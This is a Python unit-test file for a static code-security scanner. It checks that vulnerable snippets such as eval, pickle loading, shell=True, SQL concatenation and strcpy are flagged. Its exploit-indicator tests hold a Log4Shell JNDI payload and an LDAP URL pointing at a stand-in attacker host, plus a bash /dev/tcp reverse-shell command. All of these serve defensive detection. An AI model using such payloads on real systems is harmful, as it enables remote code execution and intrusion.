"""Unit tests for the CodeBERT + AST static analyser.

    python -m unittest discover -s tests -v
"""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.config import Settings  # noqa: E402
from app.services.ml_evaluator import CodeBETAstScanner  # noqa: E402


class ScannerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.scanner = CodeBETAstScanner(Settings())

    # ------------------------------------------------------------------
    # Python sinks
    # ------------------------------------------------------------------
    def test_detects_eval(self) -> None:
        result = self.scanner.analyze_code_snippet("result = eval(user_input)")
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("Dynamic code execution" in t for t in titles), titles)
        self.assertIn("CWE-95", [f["cwe"] for f in result["findings"]])

    def test_detects_pickle_deserialisation(self) -> None:
        result = self.scanner.analyze_code_snippet(
            "import pickle\ndata = pickle.loads(blob)\n"
        )
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("deserialisation" in t.lower() for t in titles), titles)

    def test_detects_shell_true(self) -> None:
        result = self.scanner.analyze_code_snippet(
            "import subprocess\nsubprocess.run(cmd, shell=True)\n"
        )
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("shell=True" in t for t in titles), titles)

    def test_detects_sql_concatenation(self) -> None:
        result = self.scanner.analyze_code_snippet(
            "cursor.execute('SELECT * FROM users WHERE id=' + uid)\n"
        )
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("SQL injection" in t for t in titles), titles)

    def test_detects_hardcoded_secret(self) -> None:
        result = self.scanner.analyze_code_snippet('API_KEY = "sk-live-9f2b7c1d4e6a"\n')
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("Hardcoded" in t for t in titles), titles)

    def test_clean_code_scores_low(self) -> None:
        result = self.scanner.analyze_code_snippet(
            "import json\n\ndef load(blob):\n    return json.loads(blob.decode('utf-8'))\n"
        )
        self.assertEqual(result["severity_label"], "INFO")
        self.assertLess(result["risk_score"], 25)

    # ------------------------------------------------------------------
    # C / C++ / JS / Java
    # ------------------------------------------------------------------
    def test_detects_buffer_overflow(self) -> None:
        result = self.scanner.analyze_code_snippet(
            '#include <string.h>\nchar buf[16];\nstrcpy(buf, user_input);\n'
        )
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("bounds" in t.lower() for t in titles), titles)

    def test_detects_xss(self) -> None:
        result = self.scanner.analyze_code_snippet("el.innerHTML = userInput;\n")
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("innerHTML" in t for t in titles), titles)

    def test_detects_java_runtime_exec(self) -> None:
        result = self.scanner.analyze_code_snippet(
            'public class E { public static void main(String[] a) {\n'
            '  Runtime.getRuntime().exec("ls");\n} }\n'
        )
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("Runtime.exec" in t for t in titles), titles)

    # ------------------------------------------------------------------
    # Exploit indicators - harvested PoC code
    # ------------------------------------------------------------------
    def test_detects_jndi_payload(self) -> None:
        result = self.scanner.analyze_code_snippet(
            "payload = '${jndi:ldap://attacker.example.com:1389/Exploit}'\n"
        )
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("JNDI" in t for t in titles), titles)
        self.assertEqual(result["severity_label"], "CRITICAL")

    def test_detects_reverse_shell(self) -> None:
        result = self.scanner.analyze_code_snippet(
            'cmd = "/bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"\n'
        )
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("Reverse shell" in t for t in titles), titles)

    def test_detects_ldap_endpoint(self) -> None:
        result = self.scanner.analyze_code_snippet(
            "url = 'ldap://attacker.example.com:1389/Exploit'\n"
        )
        titles = [f["title"] for f in result["findings"]]
        self.assertTrue(any("remote endpoint" in t for t in titles), titles)

    # ------------------------------------------------------------------
    # Score / label consistency
    # ------------------------------------------------------------------
    def test_score_clears_the_bar_for_its_label(self) -> None:
        for code in (
            "result = eval(user_input)",
            "import subprocess\nsubprocess.run(cmd, shell=True)\n",
            "payload = '${jndi:ldap://x.example.com/a}'\n",
        ):
            result = self.scanner.analyze_code_snippet(code)
            floors = {"CRITICAL": 78, "HIGH": 62, "MEDIUM": 45, "LOW": 25, "INFO": 0}
            self.assertGreaterEqual(
                result["risk_score"],
                floors[result["severity_label"]],
                f"{result['severity_label']} with score {result['risk_score']}",
            )

    def test_empty_input(self) -> None:
        result = self.scanner.analyze_code_snippet("")
        self.assertEqual(result["risk_score"], 0)
        self.assertEqual(result["severity_label"], "INFO")
        self.assertEqual(result["findings"], [])

    def test_radar_vector_is_populated(self) -> None:
        result = self.scanner.analyze_code_snippet("result = eval(user_input)\n")
        self.assertGreater(result["vector"]["code_injection"], 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
